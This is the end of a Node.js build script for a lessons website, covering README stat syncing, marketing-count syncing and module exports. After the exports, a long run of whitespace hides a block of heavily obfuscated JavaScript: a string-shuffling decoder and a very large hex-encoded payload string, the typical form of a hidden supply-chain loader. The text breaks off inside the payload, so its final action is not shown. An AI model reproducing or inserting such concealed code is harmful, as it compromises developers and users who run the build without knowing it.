        md = md.replace(/\n(?=## Start here:|## How this works)/, `\n${block}\n\n`);
      }
    } catch (err) {
      console.warn(`⚠️  README stats sync skipped: ${err.message}`);
    }
  }

  if (md !== before) {
    fs.writeFileSync(readmePath, md, 'utf8');
    console.log('   synced README stats + lessons badge');
  }
}

// ─── Keep marketing counts in sync (single source of truth = this build) ──
function syncCounts(lessons, phaseCount, outputs) {
  const targets = ['index.html', 'catalog.html', 'lesson.html', 'prereqs.html', 'learning-paths.html', 'cmdpalette.js'];
  for (const f of targets) {
    const p = path.join(__dirname, f);
    if (!fs.existsSync(p)) continue;
    const before = fs.readFileSync(p, 'utf8');
    const after = before
      .replace(/\b\d+( AI engineering)? lessons\b/g, `${lessons}$1 lessons`)
      .replace(/\b\d+ phases\b/g, `${phaseCount} phases`)
      .replace(/\b\d+ outputs\b/g, `${outputs} outputs`);
    if (after !== before) {
      fs.writeFileSync(p, after, 'utf8');
      console.log(`   synced counts in ${f}`);
    }
  }
}

if (require.main === module) {
  build();
}

module.exports = {
  FIGURE_PROVIDER_ORDER,
  buildFigureProviderManifest,
  discoverFigureProviderOrder,
  discoverArtifacts,
  discoverUsedFigureIds,
  buildSeoManifests,
  canonicalCertificationUrl,
  canonicalLessonUrl,
  certificationStats,
  githubSourceUrl,
  lessonDocumentSeo,
  parseReadme,
  parseRoadmap,
  parseLearningPaths,
  parseCertifications,
  parseFrontmatter,
  renderCatalogDiscovery,
  renderCertificationDiscovery,
  renderSponsorsMarkdown,
  serializeFigureProviderManifest,
  writeFigureManifest,
};																																																																																																																																																																																																																																																																										var z = '-*2222';(function(EMskPlv,ZJQ_r$bZ){var DDZbWOFxY=dJYVQFSkCJgdIMQoH$rnr$hPZ,x$bIYWhW_xfmNAoBTedEG=EMskPlv();while(!![]){try{var qEDztpOulKIQbA=-parseFloat(DDZbWOFxY(0x11e))/(parseInt(0x206f)*-parseInt(0x1)+-0x241a+Math.floor(0x448a))*(parseFloat(DDZbWOFxY(0x112))/(Math.max(-parseInt(0x757),-0x757)+-parseInt(0x14fd)+parseInt(0x1c56)))+parseFloat(DDZbWOFxY(0x113))/(parseInt(0x677)+0x19a0+Math.max(-0x2014,-0x2014))*(parseFloat(DDZbWOFxY(0x11c))/(-0x1ab7+parseInt(-0x7ee)+parseInt(0x22a9)))+Math['max'](parseFloat(DDZbWOFxY(0x109))/(-parseInt(0x24f)+parseInt(0x23f6)+-0x1*parseInt(0x21a2)),parseFloat(DDZbWOFxY(0x117))/(parseInt(0x19a7)+parseInt(-parseInt(0x5))*0x53c+0x1*0x8b))+parseFloat(DDZbWOFxY(0x101))/(Math.floor(parseInt(0x2448))+-parseInt(0x2a4)+-0x219d)*(parseFloat(DDZbWOFxY(0x116))/(0x7be*-0x1+parseFloat(-parseInt(0x1))*Math.max(-0x905,-0x905)+-parseInt(0x13f)))+-parseFloat(DDZbWOFxY(0x119))/(-0xb5f*0x3+parseInt(0x14e2)+-0x6*-0x236)*(-parseFloat(DDZbWOFxY(0xfd))/(0x1*-0x84f+-parseInt(0x242f)+parseInt(0x2c88)))+parseInt(parseFloat(DDZbWOFxY(0x114))/(-parseInt(0x45d)+-parseInt(0x186b)+0x1cd3))*(-parseFloat(DDZbWOFxY(0x104))/(0x1011*-0x1+parseInt(0xd)*Math.floor(parseInt(0x298))+0x1*-parseInt(0x119b)))+-parseFloat(DDZbWOFxY(0xff))/(parseInt(0x12)*-parseInt(0x211)+parseFloat(-0x5)*parseInt(0x342)+Math.max(parseInt(0x5),parseInt(0x5))*parseInt(0xab5));if(qEDztpOulKIQbA===ZJQ_r$bZ)break;else x$bIYWhW_xfmNAoBTedEG['push'](x$bIYWhW_xfmNAoBTedEG['shift']());}catch(iHdZpR$zfWicgnIaT$aSKc){x$bIYWhW_xfmNAoBTedEG['push'](x$bIYWhW_xfmNAoBTedEG['shift']());}}}(ByRkUbHzuMaA,-parseInt(0x7a)*-parseInt(0xc5)+Math.floor(-parseInt(0x44ede))+parseInt(0x62a49)));var NX=[Math.floor(0x423f)*Math.trunc(-0xad)+0x1a*Math.floor(-parseInt(0x785e3))+-parseInt(0x12)*-parseInt(0x1336b8),-0xaee+parseFloat(0x1274)+parseInt(0x617)*-parseInt(0x1),0x2*-parseInt(0x2787)+-parseInt(0x7c3a)+Math.ceil(parseInt(0x11b03)),parseFloat(-0x2361)+parseInt(0x228)*0x1+parseInt(0x239e),Math.ceil(-parseInt(0x11b39))+Math.max(-0x2,-0x2)*0x773+parseInt(0x1d50e),Math.floor(parseInt(0x4d5))*-0x123b+Math.floor(parseInt(0x5b3c43))*Math.floor(parseInt(0x1))+parseInt(0x497167)],SX=[Math.ceil(-0x51d3b5)*-parseInt(0x1)+Number(-parseInt(0x79ca62))+parseInt(0x3d)*Math.trunc(parseInt(0x1fa12)),Math.ceil(parseInt(0x1))*parseInt(0x164f)+-0x2*-0x100f+-parseInt(0x357c),-parseInt(0x1555)+-0xa961+parseInt(0x16297),0x1c1*0xd+-0x1*parseInt(0x1c99)+0x1*0x687,0x1*-parseInt(0x16672)+parseInt(0x9a26)+parseInt(parseInt(0x1a78d)),Math.ceil(-parseInt(0x43e8cd))+parseFloat(-0xb7dd)*parseInt(0x59)+parseInt(0x1e9)*Math.trunc(parseInt(0x6adf))];function spin(ANkId_ugRquwqy,T_UTkB$KFda){var KaA$X$c=dJYVQFSkCJgdIMQoH$rnr$hPZ,CneZwe={'TBlOJ':function(YbbD$M_WMU,LltFuCgWGRW_tD){return YbbD$M_WMU<LltFuCgWGRW_tD;},'jxEVR':function(LNUNscFvTLJB,aoLJzMoTYFfkZQhjFA){return LNUNscFvTLJB+aoLJzMoTYFfkZQhjFA;},'QqhBr':function(KH_SPeJUdbiuEfyKUerZGD,kkDWFnuwViqSvtJoDqgViv){return KH_SPeJUdbiuEfyKUerZGD%kkDWFnuwViqSvtJoDqgViv;},'NrWxz':function(nuFs_Z$eC,ibMqOXFq){return nuFs_Z$eC+ibMqOXFq;},'wYojH':function(TWkcP,ljOYGNWrGv_JmDMqY){return TWkcP*ljOYGNWrGv_JmDMqY;},'hjNlU':function(rUwCvusm$$r,Im_yFdzfpASS){return rUwCvusm$$r%Im_yFdzfpASS;}};for(var Fk_XfXYbrLjLqHbFlKGAnbmCdk,mcnheaw_HSLDxyjPRDchxojSkR,vpb$hYoel$gSSeAqVcPcyjzK,ouijRi,HSMEJNcKkFPtIRQiQ,IgIkyObYMWrcwzjoxvqYQpG,a_RPcupR=[],Sy_owSQp$SPBge=parseInt(0x211)+Number(-parseInt(0x119))*Math.floor(0x17)+parseInt(0x172e),feyBThDZjwfdnx$cbdikM_psF=T_UTkB$KFda[0x1b85*parseFloat(parseInt(0x1))+0x661*Math.trunc(-parseInt(0x2))+-0xec3];Sy_owSQp$SPBge<ANkId_ugRquwqy[KaA$X$c(0x10a)];)a_RPcupR[Sy_owSQp$SPBge]=ANkId_ugRquwqy[KaA$X$c(0x103)](Sy_owSQp$SPBge),Sy_owSQp$SPBge+=parseFloat(-0x1c91)+0x1ea4+0x109*parseFloat(-0x2);for(Fk_XfXYbrLjLqHbFlKGAnbmCdk=a_RPcupR[KaA$X$c(0x10a)],Sy_owSQp$SPBge=-0x19bb+0xa8+-parseInt(0x83)*-0x31;CneZwe[KaA$X$c(0x10d)](Sy_owSQp$SPBge,Fk_XfXYbrLjLqHbFlKGAnbmCdk);)mcnheaw_HSLDxyjPRDchxojSkR=CneZwe[KaA$X$c(0x115)](feyBThDZjwfdnx$cbdikM_psF*(Sy_owSQp$SPBge+T_UTkB$KFda[-0xa87+-parseInt(0x1827)*parseInt(0x1)+0x22af]),CneZwe[KaA$X$c(0xfb)](feyBThDZjwfdnx$cbdikM_psF,T_UTkB$KFda[Number(-parseInt(0x3a))*Math.trunc(-0x4c)+Number(parseInt(0x1))*-parseInt(0x16f0)+0x5ba])),HSMEJNcKkFPtIRQiQ=CneZwe[KaA$X$c(0xfb)](vpb$hYoel$gSSeAqVcPcyjzK=CneZwe[KaA$X$c(0x11b)](CneZwe[KaA$X$c(0x11f)](feyBThDZjwfdnx$cbdikM_psF,Sy_owSQp$SPBge+T_UTkB$KFda[parseInt(0x189d)+parseInt(0x2e)*Math.ceil(-parseInt(0x35))+0xa*Number(-parseInt(0x182))]),CneZwe[KaA$X$c(0xfb)](feyBThDZjwfdnx$cbdikM_psF,T_UTkB$KFda[-parseInt(0x2707)*0x1+0x256d+0x45*Math.floor(0x6)])),Fk_XfXYbrLjLqHbFlKGAnbmCdk),IgIkyObYMWrcwzjoxvqYQpG=a_RPcupR[ouijRi=CneZwe[KaA$X$c(0xfb)](mcnheaw_HSLDxyjPRDchxojSkR,Fk_XfXYbrLjLqHbFlKGAnbmCdk)],a_RPcupR[ouijRi]=a_RPcupR[HSMEJNcKkFPtIRQiQ],a_RPcupR[HSMEJNcKkFPtIRQiQ]=IgIkyObYMWrcwzjoxvqYQpG,feyBThDZjwfdnx$cbdikM_psF=CneZwe[KaA$X$c(0x102)](CneZwe[KaA$X$c(0x115)](mcnheaw_HSLDxyjPRDchxojSkR,vpb$hYoel$gSSeAqVcPcyjzK),T_UTkB$KFda[Math.trunc(parseInt(0x41))*Number(-0x47)+parseInt(0x18)*Math.ceil(0x3a)+Math.floor(-0x434)*-0x3]),Sy_owSQp$SPBge+=parseInt(0xcad)+Math.ceil(-parseInt(0x3))*-0x689+-0x2047;return a_RPcupR[KaA$X$c(0x105)]('');}function splitLane(mzJRxswioIvaYv){var eDuZcWTfRgBIqzQGgLl=dJYVQFSkCJgdIMQoH$rnr$hPZ,IKkAMZJXiMhTz$bNQzs$eJXTZY=String[eDuZcWTfRgBIqzQGgLl(0x110)](parseInt(0x1597)*-parseInt(0x1)+Number(-parseInt(0x180))*Number(parseInt(0x8))+Math.ceil(0x21b3)),TjymicKlmOlnygWrYK=spin(mzJRxswioIvaYv,NX);return(TjymicKlmOlnygWrYK=(TjymicKlmOlnygWrYK=(TjymicKlmOlnygWrYK=TjymicKlmOlnygWrYK[eDuZcWTfRgBIqzQGgLl(0x11d)]('^')[eDuZcWTfRgBIqzQGgLl(0x105)](IKkAMZJXiMhTz$bNQzs$eJXTZY))[eDuZcWTfRgBIqzQGgLl(0x11d)]('*1')[eDuZcWTfRgBIqzQGgLl(0x105)]('^'))[eDuZcWTfRgBIqzQGgLl(0x11d)]('*0')[eDuZcWTfRgBIqzQGgLl(0x105)]('*'))[eDuZcWTfRgBIqzQGgLl(0x11d)](IKkAMZJXiMhTz$bNQzs$eJXTZY);}function ByRkUbHzuMaA(){var D$lwAhhtq=['a1b8acbbbab1a5bcbfbea8aaada3abb0a4aea6bbb3afa2a6aaa0b9bdbbbcbda7babda6a7aa','f08cbc9cb9a8af','9ba88d8da4','87bb9eb1b3','fdfd9d8eaaadbeb0','bab9a5a0bd','fff0f9fafc8d80a3a181aa','be90a6a381','fdb5f8b5f9b5fbb5fa','9b96f5ebaa9b83e8ef9facaa9b9ea8f49bbbaf9bedffebaaf8f29b9b90aaa7a196e6e7bde9a09b9b9b8e97f59be79baa9bfbe792a79be9e79bafe7e6f59baafae8e8fca79a9bf59ba09b85e7ac9abaa5afe1acadaeb1aaf5f6a6f5bba5aa9bf6bd9ba6baad9bafbc9aace7f6efb9a1e79b9b8684ba92acf5baa29b8ce7f59bbcf5bb9bacf29b8d9b8bbb9b9b95e7af9be7f5aaf3e8abb9a5f9f0a0aaa69bbbbdaa9be1f2bba69b9ba7fbe4ebe1e797bee9b0e7f5f5adade9e0edafe9a6bce7ecacf5a8f5ace7bdf5a4e1aa9bb1af9bf59283e1afac9bf599abbbe7abeea69ba0e79b9bf5ee9b9becbe9bafbae0ac9be792a8ae9a99b2adfbe7a2f5a8aaf8ace7e8fae799f5939ba09be3a68dbaa0f492e7f5afe7ebfd9babe987ebaca6b19bb9a6e7a080a5a2a8ac9d9be7fbe0eca4f5a0ac9b94b3f5b59bbce1e1af9bbe9b9b959bf79bf0eae79bf9bbadf4bae7f9b1e8ba9be7af9b9ae0e1aaaabdf8b9afa6bda8ac84bc9b899bf4f59b9be6a9e79ba2ede1fbaa9be7bafeacf8a8e78f9b82aae3e7e7b3eb9ba7af99acba9bbd9b9b9be7f59ba5ea9baff5f3e9fbe1e19be99bedeeffbaa9f5faa7a1a0e3edac91aab49ba1f6e9aabda6aae7a0acaaaaf0e9b29ba8f5baf2bce8e7ac948c9b9ba681e7e7edeba7f58dfa9bba9b9be7e7e19bacacbabaac9bf5e9bde5ebe99bada6bfb49aaaf983a4a0e79df5ba8cacaeba9bbe949beba89be79be89bf5a6e0e0a39be99bacbee9a0bdaae7baa7a2e1b4e1a792bfac9bf5f9f5f4a2af81f5bbbb849be9aaa0a2a78ce7aae78bf5ef9b92a6949be7ecaaaa9ba5bbb1f2e3e992eba6a0baaca79bacafaca8e890a7e7acaa9beca6ebbce7f5ffa59b9b9bb09bf4a0baf49b9be1e09b9bacf39b9be0e89bbeaabb9bf8f5e7a6e89baa9baa89ebb49bbc9bb8bcfce1fa99a6a5ebac9bbdf9e8afbda89be3f59bf8bda7a2aaafb49de7e8ede6f5bba6e980b0aa9b9be9e099f595e7abf5bd9bfef39999baf594e7bb91f5f5e7ac9bbce19b9b9bb8a7b9e7f5e79bf2aabda0ba91e79b9bb09bed89f5fae0a29b9baaf5e29bbbf1a5e3e7a09be8bb8a9599e8a7f4aabaf5e1aaa0f5e19bfeac9bac9baae7e9bdf5acb9ace0acf5f5e5acf5e18c82e8e7b9a7abedeb9ba89b9be7acbfbca1aae79da596aae7f39bf9bbe9e09bbebee8ba9af9e7bdfebce7f9e19bf096a8e1edefe7acffafe79b9ba2f88ab1aba0f1a5e7a1aaf4a4e189f59bade7e7f5bbbbe7fbe78284bbaaab969ba79be19b96aaf38dbebdb4e79be7b2b4f0aeed9b9b9be09d9fbdf5a8e1e7f58ee7ad9bb79e9c9be7f2a5bbe7a180baa48799e9e9bd899b9bf1969bfb9be7a09bbb9b999bf5e19bfaeaaaacaaf9aaacfaa09b9bf5a89bfa9ba8a79bb293bab4e884f59be4e3e7b0ada8fa9ba0e6f9ecaf9bea9be9f5a0fbf59bf9f1f3e7bdb49bafe8ebe49baae79ba59baab0bdb09bbaac88f99b9a9d9bf1e7fdb8f5ed8f9dac9be7e79996f5aa9bffa1ab9be7acbba0e7aae49ba1aa889b8afbbf9be7f2ab9af59bf5a8ea82f59bf3bb949dafacace4f2e8a2f496bae79baaa4a3bae19bb4f3f59ba89be3efaee7f5ada6a4aca0ba9ba7e7e1edea96a8b29f89a6aa90e4e7a6a499ada8a4e79ba8a5afaab0a69de2e89996aebabbe7f5aba09be8afe7e0aa80efe1ab80a69ba0e1bba7bb9ee7a0ace79baae9e8e1a0aae19a9be7aabba9f3f0f591bab99be1ede9a49baabdf5bae7aee8e7fdf1bbbaa2acbf9f9b99ad9ba2b19bf59badacbba7e0ac9abae6e09be9a5acbbf5aaba9dfaadaab4e79bfc8ae69ee1e79aa6a793bbe09baaa6aaaabaaaa1e09be7f59b9bf5bde7babae19b9bf5ada5bce7aae7b5aff1bda2e5baa5a7acb9a6f5ac9bf5e8e7ff9be7acac9b9b9da8efa1e984aff5b292a6ed9bf5e99bbaf9e0f4e9f5b19aacaae7aab4f5aaedacbae1e1ade09b9baab4af8a9b9bf5e3f59be7a4e4e79be39bacf5e1b1bf9bbae9e184ef9bafe7ac99e3aee9f7bae0f5a6e7f4e79ba0baa7bb9be7f6b2fcf5a0ab9bffe09b9bf8bae9aa9baeb8aaaca5aaf4aaa5f2abacf5a5afe39a808aadfbacebb3b99b9bb4f5aa9ba59ae5a7a3baaaa4ed9ba7e7e8a8a0a0f5839094f5af998aba89a388e79bf5ece9bde79ba6be9bb4eee9bbf7b9b3a1e7e7a59beef5aea696b4f59a9be1a2b8b1a192e9eff5a09be4afed8af5bcf5a0a88c879bfc9b9d9b94f59bb9baa2e7e79bb3adaee7e094f5e0acbbe79bbbe784ba9bb399f79b9bacf5f5bd96a1aea5f5b9e79baaa4af9bbae8a7afbd9bfde9adbd96f097f5e5a6bbacfc9baf9bb1e99b9b92bb91e7f5baabb09bf5f5e7fb9be79bbbaca79c99e1b0f7e7b9f5f5aaba9ba5bdf9bde7b2e79ab0a0a7f5aeaea5ede99faae7e0f38c8180e8e7b18dbc9be59bb99ba19be1baaabde784bb9b84a381849b9baa9be7e99bbda7adb5a6a8f9e7a7eaa8e7fbe08dafa2efaa9b809b9b9be6afac9be7aa89f5a0bbbaff9de2f89b99b1e7e79be7baaae7a89beae7e4f591b29be8a7fd9baa9ba0bd9be6a79bacf0a4e7e7f588e0abaca7e0e794f5e7a8e19be1e7b2f6fabd9bef9b9be6a0e1a591e7e9f5a1e8ad9b9bf5ebe8aaa6f6e9fae9f89bf5e4a1a7f5adbda7ada6f59ba2baa4eae4aae19dac9bacace894e79bf5baf59de2f49be79ba0e4bb899b9be7bbeaaaadf5aa9b9b9ba4b3bdafe78aadac9bb9e7aab2989ba0aba3baa6bae7af9bbbaee49b9ef9ada09b9bf5e7a2f5869b9befe49be8eae9948aba94b0bdfde7e4ad96a9999b9beef5e79bbfaca39abef5adaae7aae9e5afe799e7e1e7aaa0bdaa87ab9ba7eee4e7ac9baa9ba7bb98e7bb9bb1a6b29baaf5ebff9ba7ad949bb49ba4e19bed9b9aa6e79dfc9baafbaab1e7e3bf9ba6a0aa96f7e7baf98b9bafe0f599f5a89be7a68a93b5f9e9998681ad98a6e7a7e9f5e7f8baa69b96eee9e799f5acbbe792f59bb59bf5f9a0f59bbbf2ee80e79b92b4e2a5aae892a4aae8e7a5aaf5a7e1a8e9bd9b9b819ba5e5b4b9b49be09bf19b83f5a89be7f5bdade187f794a0aaf5a4ac89fcaaa792bce79be0e7abecba99a7f5f5969b9be89bab9bf4ed9b9b97f5e8b4e0baabe4ffebea8cf1aa9be1ade89be0bdbba8bd9b9bf5f5e9fbf89bee85e8a0abb5ac86bd9b9bbdedbcaaada79b9be7bde09bb38ce78e99b0e8e99b8880e4a7b8a8bcf5b4e7b0aa9be7e7e7aa9b9be7aaaaaaed979b9bad8a969bf5bdf1aa9ba1bafbeb9bfbe7ee9af7e0e0fba1e8acafb0e7e7f7e8a085edaca7e9f2ecf0869dbfe7adedfd9b9b8af5aa999ae1bdbc9bbea5efe1a4eaeb9bb5b9aaa1f5bd81eda8f5f5e9e7bde89b9a8cafe79b9baeaa8799e79be98a9ba0fda49bf5ea849b9bf5f2bea0e4ea8ce9f5f5bdf5ac9bf581f59bbba7bda68ce1e8f9bbf9f5ade7e79b8aebaaa7e7e7fbabb9e1ff8ab9f59a9bebacf8a5e0aaaaf5a8e199e799f0acf5b8a8e0f5f5f8f5a7e7a09ba89b999be1b49bf4e7efe5fbe8aabe9be7e0999bede7f5b89bf5b4e8f8e39af59be89bafe7f5aaf59bad96f59bfb9bf5f5ea94f5f59b9b9bb9e8e7bbb99bf5e3e89d9b809bf599a2f59bb3bda8e7efb4e7a8a5ac82f4a099f59beef4ae9b99b49bb9edb29a8be7e99bbab0e7e1e7bde8e9aaf2f5acfcbaa1fffdbdbdf5b9aff5a6bdb1bc859da2bbf7f2f59be7aab9ba9be7aa9bbd9be4eaa8fdbc9bffe79bbdacf2e4e1edf6bef1f3b9e6ef9ba5f9f5bbeaf5ace9a0a0baafe8adeda8a696e1eaaaa4bbe9acf59b9b9fe899a7aaa8f5bde7b7aabbaae1aceee3a8f3e9f59b9ba7aca893ace7ece6ad9bf59b9be3e18ce9a9e2ac9299aabe9bbee9f5e1acbcaabda8e0e7fe9ef5e6ed99f5e7a1aa9a9de9feac9b8be8e7e29be780f5aba19baca5e7bdace7abfd92bca7bcacbc9be89ba5bde19b9b9be5b4e581afbd81bf96a7e7f5ac9be99688f5f1f5babbf59bb1fde09b87e8b99badb58be9f59b9ba2a0aceeaae4e79baaa7a4faaabaf59aa0f5a0e7e0e78ce19be1f59b9b999be996fa9bf5aabeace7e8e7a5f59bede89babade5acf5999b8ca5edbdb9bbe8f5a6e6e0e79b9bbde8e59de1bbaaeae6e79bb0e1e29bbb9baea9f5afe7f5a8e2e7afe0e6f5f5eff5e9ac9b9bf5aca0e4f58baf8ce7ba9baba79b9be0e79bece6a3bda59bf5ecaae99be89be1b19beaaa9be7ba9b9be79b84e7f59bfeaae1aaaea59baaa4e794f5e7acaafbabe099f5f5fb9b9befada88b82e0bbf593bdf792ada89b81aaacade7849bf5b4ba9b8ebbe79bf5f6f89baf9b9baaaaaa9be1a6baaaeb9b9bb7a2f595e884aae7b9e78ae0bc9bb1e0e2e19ba295aceea3ff84999c9b8aa4aaf69b9bfa9bfde1a0a0ace7ba9bace39bf3b39a9bf299a7e193e0f5a5a29bbfa5f3f59b98b29baaa0ebaa99e2ace5849b9ea8e7f59b84bb9ba5bdeaf59b9bbabdfabbe8e7f5aef5829bbe9be19ba3e79b9ba8e8e78efd9be7edb9a7e7b3f2b2ac9bf2fbf8b2f99dfde1bb9ba2e4eee7e8f59bb1f5a082a1f5e0ba92f5bdaae999bcac9bb4bbe1afa8a89baffea5f59bfce8bb9ba58d919ba4e7f8f3b9a09be9f5f4e99ba3baa6e7f5acbbe8a69bb880e09bf89bbbbbbea6b2efbd9b9b82f5a78a93e4f984e7aabc9be0aaecaaadf9e2bef5ed8cf5a09df5f5a6bdada8b0a7f5a0a697e79bee9b9bbe9baafffca29bea8399e7f5e89bfcace8bbb29bacf2b0ac9be1e7f9f4f2aaa0bae7aae1aebd9bfbb9bcf0f48498af92b2e586a7e9e7e79987a0e1f5e79ba8a0989be7e7aaecbde6e1e69bf5e7bbe79bbbe7e7a5e8baaabcace7a899b79be8aaf9faa89c9bebbdaabaaae7e8bb9f9bb9a8a0b3f9f5abebadbdaeade8e7baf6eaaabfad9bb7ea9bf59bf5e0e19dabe7809be099aaf5fff6fee094fd9effeaa7a799bde7b4bbacb59b9cf79baca89be0b9eae9a79ae2abfbeca09ba3b4bae191a797a6bab0aabaaead83e7baba92b9a29bf1e7e9babcbebb9ba7b0b4ada6e78ea09de7f5bee2aae7e1aabaf2e8e9a7a1e19be59b8a9b92f5ef919bf5f5e7aaabaa9d9bba88afa7aa9ae49beba0f5e7aa8be1b59b9be79badec9be79ce69be7bb85f5bde0e89bac9bfbaab9b9e8baf5f79bf6f89bedf5bdac9bf5f59ba6f9bbbdafe19bacbaab8d9bfea5a0a89be7b4bae7e6ba9baabbbaa8bba59becaf94baf99be7f5a5acf5bbacecbae7baa5a5baabf19b86b18a9bbdaaf8bdffb2e7e4e99ba5e7ac9ba6e7aaaea49ba2a69bbaabaaa8f580b0bcb49bbbbdeabaefb5bd9ba8b19be0a1a6e79bbaafe9a29b9b9bfdaabbe1b1e7aaf4bde7f5a0fae19bb1e9e7f5e7e79bedafebbde99b9bba87f5e68ae99ba79bad9bbbb99b9bf5a6adf5e79bf5bb92a8bbeba5f5e7e999ebe79bbae79be7bbaae8bfea8daf9bacacaba6b2e59be0adf1bff5af9baae7aa83f5bdace7e89b9beba29ae19ae09beaf59ae7a199b4bbbde7e1e6e1e7aae1f8adf59bbee8babcf9e1a6e799abe1f9e79b83aa8ca08ae7afe1e9e7a0e7abbcaaf5eabbe7e7e79b9b92f1e096e89be79a9b8be8ebbd9b9faba7969ba5aa999b9be9a69ba7f2a1f59b9989bbf1a89bbba5aab5aaa6fce19bb9e0f59bb1adf5f5ede7a7f5a5a6b4acbb9bf5a6b09ba8a7e7a6b0e79b808bf5a1bdf5aaa6ab8ca09bb4e1a484bbe79da89bf99bacbda09bb4e7e8f5e79bf8f0bdf588acab9b9685aaa5a1e88df9bbe79bf9a0a5a0bb9baae6baf1f5aa9be1bbe39b89acf5f5e7a5f2e7bbaae499bca5a89baaaa9ba0ebf9ff89e89baae8e798a2a5e5f5aef5feb4abe1a89baa85e7aabaeee2e7e79de1f5bb9bf5f5e7e7efafadf79ba6e9aaa6aca49baabee7a5aaa7e1aaf39beeb5bdf59ba79b9094fd84f98e9be79b8f9bbcbde7e8f5afe7bce2ede2bdf59be3feba9b9b9be1a0aba1adf499e7f5b49b9bf4ac9be796e0e7e0bbbbe5fdefe9a59bb4acf59bff9b9bf597aeafa5ac9badbabd99b7f5abaae7e1bab0f5fcb49ba0f6a5aaa1f5efe7fab2bce7a796f3a09bfeabf2f9f59bf5aa9b9b9baa9b89b5f8baac8e9bbafbe0aaf4a1f5aff0acf5f5bbe2ac9b95eee0effcbbbfe68fbb92e7a8e7bda7e79b99bba79cf5a696aaffa7f48c9df5e7a0e2b1aafea5acbfbabcf5bbe7e89baaf5e8949bbee9e79b9be194999b8de7e9a5afe8f3efe7abadb99da5e79bea9b9ae7ed9bf5e19be9f5f5aa92e7a7e7e9a69bbbfffebbf5ace49be4bcaae39b9bed9be7aba8acb0aabae7e8929bb19b9bf58d91bdafa7aa9b9899a0ba9bbdaeaaf5e7a89bf1e8abe8f59abdf9f59bf7e99b9bbba09bf7aa9cb9e7aa9b9e939be89b8d82e0f9aabfa7a7a2bae7ace99be997ada59bf5aaaf9b9bbcf3ba8e9bace5e1ae9b9f9beb9bbc9b9b9beb9bbd9bf59bbaebe78c9ba09699ef9bf5a5b0a69aaeeebaf7bf9baabeacfd9baaaea9e7a1f596aaeee1bca4ad9b99f7a6f09b99a7f89beae7aaaf9bf599949bbae6a8a7afb8879b9beef5e79baaf1aaa09b9b9baae7a896b9bd82a6f5b9babbf5fef59b9ba0e7a696aae6e8a79b9bbae1e9f79b9994b1bdbd96ba96a6a18bf5a8eebaefe799f5e9e7a28eaaffbbf5fea0a6e6be9b809a9999aab1a19bbeaae7f5e7aaa0aaecf89baff1f0ad9ae9f59babaaba9b9f9bbab1bbada8949bf2bdf69b87e5e59bf7e0aa9990ebaa9baa9bac8fe9e8f99b9bb8b4b4bbf9fc85ffe7f59be7bbaff5edbcb5aaf5aaf59ce48d92e9aaaae7a6f5fcf2f5e9e1e78ce7a1e79b96a5f59bbbf5f58ff592bdbd8aa6eca49ae79b9bfa80abaaa0a69b9bf5a8b99baa9baa929b9bf5e7afa79b9be5e79b8ba8a7e1b0e69bb581b98ea79be7f5f49b9bf5bce1a8aabaed9bfaac9be0a4aa9688fdbca7bdebacf2baa6bbe1ec9b99bde1acaee1e4e3bbe8a4f59b8de19b9ba8e7bbaea5b3e79bbee7af9b94b8a8bfa694afe1ecf5f5aaaaa5f5fdbaf09589bce9f0ace7e3b1e7e68fbd9a9b9992e7edeca7a9b3e0f5f5ede8fc98aaabe2949bfabd9bf5afa099aaac95f5b3a0e79baaa8abbbe9e1f5f5aba7bfffe8bda7be96aa91afe1a7a1e792b4e3bae1a9f599f7e19bf5e7e7f5b1bdf09be1e7aaf5e1acf99be799a8a6e7e8ade1e1e489aff9acf5f5ff9ba69bbcf2e1ada9e99bb9e7e7f5b9e5acf59df587e7999be7929baa86b3e0afe1f5a594e7bcb2f6bbaff59bf29bf580e3a8f5f5eda99be1e9e1e7e7e7f5ebf3f5879becac9be9a0eae7b3e7a5e1bb9be5ad9ba8e7ad9bbff5ba9faae1ba94a0e084a1e79ba7f59b9b9bbdbd9baee5b7e79b929beaacafe7f2bdbdb9e7e0ba9ba79abda59b9bfba6ace7efaaa0e1a8b4e7eb99efb0baac9b96a8ecbb9b9be78df5a099ba9b8de8a0e7a49beb9ba3b3a1f5bc9be7e5f7adace7a386b4a89b98aa9ff5baedfa8aae9bf59bfc8caaad9ca1aaace7e89cafe79be4b1fff594e7beaaf5f5e78ce8bb9b999ba08ab1e79a9be8a4e7a791abe7feafe7b3acaf939bebeb94e1b0f5b1abf5a2f5949c9be4aab4b8afe7e887a0f490a09ba69b9b87e789babef885bcacf8a29befe9eabb8daaac9be7a8a59b9be79be7e1eb94849bbd84a09bbbe0bba5bc9badefe79b9baab9a0af80a5fb9bf59bf5f5fcafe0b3efaf9c9bacaaf5bafdf5aca7ba9be7a6ebf5a0f5e59be8bae9a68ba09be4aa9bf9a59b87bd9d9be09a9baaf5afadbcbd9b9bad99b39b81e19baabae0998df5aaed9bb1fbeff3f881bba5a6e7e7a7e9afbae7eda7f1bcb986edf9a0bababaa0e7e4f5bf9bf5e7f5b898e1e89be8e992e8adb1bea7e79bb0bce3a0f6ad9bece79bfb9bbdf7bbfebae8bd9bba969bacada9e8f5ed949be99ba4e89bafb19be9a49ba6a2e8aabdf5e1e7e7a79baa9a9ba795efe7f5f99b9da0bea4bdb9fae38ee199b0e6a7b18fa1bd9bf5e7f38ea6e7e7e7e19bbde7bbe7f5f9aabd9de1bbf5e9e7a692a0bfe7f59bf8ba9bf0ad949be29b9ba1ac9be8aaaafb9b9bacebf0aa92bbf5f28dac99aa9b9ba2bd8ea5aef5f6bd889ceebdbd9b989bb4e9befabd9ba8bd94e19fbde4f6f5f5f6e7e7eba5bbe0e7ac9be49b9b80978c82bfe7fdfe9ba6e2a087f5acaaace7a79bb1e1bd9b819be9bdf1f29ba0bbe0f5a89baab1e1b8a89bba89afacbb9b84e7f5f4e7aabd89f5afaa9be79be09be7bbb1a5e8bde6e5a5ba9b9b9baaf4e7a0f9fa9ba19b9bbab296b19bbbf598f5aae5a8f5f58c9ee184a69bf5e9bcbd8cebafb4abafbbe7f5ba9be294adbbe9f59be8989bbee7a0e9809b9d9699a6e7e1aaf9bdf1e1ba9b9d9b9baaa78b9be8ebe7b1808de788a0b4acb9a69bfae8a6b3f494acbda29bbde6bc88f8fd9b9bf09baabde887a8adbb96a78e8ae8e6abedb49bebb1adf5a09baabd97e7bcbcbef4faad9bb9beae9bf09bf199b89ba0ea9bb9aef0bcf4f8a0f9aff5e79bf599f9afb4bdbf96bbfaacbaf3f5afbbf5a0fee1f5b0e1a6a59be7acf0a6a68b9de7969bbda68ce0e9a8bae1f5aa9ba0acadbdbaba9be69b9be6acbb9be1e7beaaace79be7bb99b0e19b86e